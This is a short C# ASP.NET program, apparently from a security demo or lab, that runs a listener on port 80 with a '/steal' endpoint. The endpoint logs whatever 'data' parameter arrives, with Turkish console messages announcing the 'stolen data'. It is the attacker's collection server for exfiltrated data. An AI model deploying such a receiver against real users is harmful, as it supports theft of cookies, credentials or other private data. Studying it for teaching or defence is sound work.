var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.MapGet("/steal", (string data) =>
{
    Console.ForegroundColor = ConsoleColor.Red;
    Console.WriteLine($"\n[!!!] VERİLER GİTTİ BE YAA [!!!]");
    Console.WriteLine($"[!!!] Çalınan Veri: {data}\n");
    Console.ResetColor();
    
    return Results.Ok("Data received");
});

app.Run("http://0.0.0.0:80");
